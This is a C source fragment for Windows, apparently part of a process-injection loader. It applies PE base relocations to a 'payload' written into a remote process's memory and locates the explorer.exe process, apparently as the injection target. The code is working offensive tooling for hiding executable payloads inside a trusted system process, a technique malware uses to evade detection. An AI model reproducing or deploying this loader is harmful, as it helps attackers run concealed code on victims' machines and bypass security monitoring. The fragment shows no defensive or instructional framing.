BOOL HasRelocation(LPVOID pImage) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pImage;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pImage + pDos->e_lfanew);
    IMAGE_DATA_DIRECTORY relocDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    return (relocDir.VirtualAddress != 0 && relocDir.Size != 0);
}

// ========== RELOCATION PROCESSING (x64) ==========
BOOL ApplyRelocations(HANDLE hProcess, LPVOID pRemoteBase, LPVOID pLocalPayload, ULONG64 preferredBase) {
    if ((ULONG64)pRemoteBase == preferredBase) {
        printf("[+] Loaded at preferred base, no relocations needed.\n");
        return TRUE;
    }

    printf("[*] Applying relocations (delta = 0x%llx)...\n", (ULONG64)pRemoteBase - preferredBase);

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pLocalPayload;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pLocalPayload + pDos->e_lfanew);
    IMAGE_DATA_DIRECTORY relocDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (relocDir.VirtualAddress >= pSection[i].VirtualAddress &&
            relocDir.VirtualAddress < pSection[i].VirtualAddress + pSection[i].Misc.VirtualSize) {
            DWORD_PTR relocVA = (DWORD_PTR)pLocalPayload + pSection[i].PointerToRawData;
            DWORD_PTR relocEnd = relocVA + relocDir.Size;

            while (relocVA < relocEnd) {
                PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)relocVA;
                if (pReloc->SizeOfBlock == 0) break;

                DWORD numEntries = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* pEntry = (WORD*)(pReloc + 1);

                for (DWORD j = 0; j < numEntries; j++) {
                    WORD offset = pEntry[j] & 0x0FFF;
                    WORD type = (pEntry[j] >> 12) & 0x000F;

                    if (type == IMAGE_REL_BASED_DIR64) {
                        DWORD_PTR rva = pReloc->VirtualAddress + offset;
                        ULONG64 oldValue;
                        SIZE_T bytesRead;
                        if (ReadProcessMemory(hProcess, (BYTE*)pRemoteBase + rva, &oldValue, sizeof(oldValue), &bytesRead)) {
                            ULONG64 newValue = oldValue - preferredBase + (ULONG64)pRemoteBase;
                            WriteProcessMemory(hProcess, (BYTE*)pRemoteBase + rva, &newValue, sizeof(newValue), NULL);
                        }
                    }
                }
                relocVA += pReloc->SizeOfBlock;
            }
            printf("[+] Relocations applied.\n");
            return TRUE;
        }
    }
    printf("[-] Could not locate relocation section.\n");
    return FALSE;
}

// ========== UTILITY: GET EXPLORER PID ==========
DWORD GetExplorerPid() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return pid;
}

